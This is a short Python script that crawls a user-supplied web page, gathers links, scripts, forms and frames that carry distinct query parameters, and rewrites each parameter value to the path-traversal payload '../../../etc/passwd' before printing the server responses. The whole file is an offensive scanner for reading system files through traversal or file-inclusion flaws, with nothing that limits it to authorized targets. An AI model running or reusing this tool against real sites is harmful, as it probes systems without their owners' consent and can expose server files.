import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

def extract_unique_parameter_urls(base_url):
    try:
        response = requests.get(base_url)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error fetching URL: {e}")
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    seen_params = set()
    unique_urls = []

    tags_attrs = {
        'a': 'href',
        'img': 'src',
        'script': 'src',
        'link': 'href',
        'form': 'action',
        'iframe': 'src'
    }

    for tag, attr in tags_attrs.items():
        for element in soup.find_all(tag):
            url = element.get(attr)
            if url:
                full_url = urljoin(base_url, url)
                parsed = urlparse(full_url)
                query_params = parse_qs(parsed.query)

                # Add only one URL per unique param name
                for param in query_params:
                    if param not in seen_params:
                        seen_params.add(param)
                        unique_urls.append(full_url)
                        break
    return unique_urls

def inject_payload_and_print(urls, payload):
    print("\nInjecting payload and printing responses...\n")
    for url in urls:
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        injected_params = {k: payload for k in query_params}
        new_query = urlencode(injected_params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))

        print(f"[*] Testing: {new_url}")
        try:
            response = requests.get(new_url, timeout=10)
            print("----- Response Start -----")
            print(response.text[:1000])  # Print only first 1000 characters
            print("------ Response End ------\n")
        except Exception as e:
            print(f"Error requesting {new_url}: {e}\n")

if __name__ == "__main__":
    user_url = input("Enter website URL (e.g., https://example.com): ").strip()
    if not user_url.startswith("http"):
        user_url = "https://" + user_url

    found_urls = extract_unique_parameter_urls(user_url)
    print("\nUnique URLs with distinct parameters found on the page:")
    for u in found_urls:
        print(u)

    # Payload injection
    inject_payload_and_print(found_urls, "../../../etc/passwd")
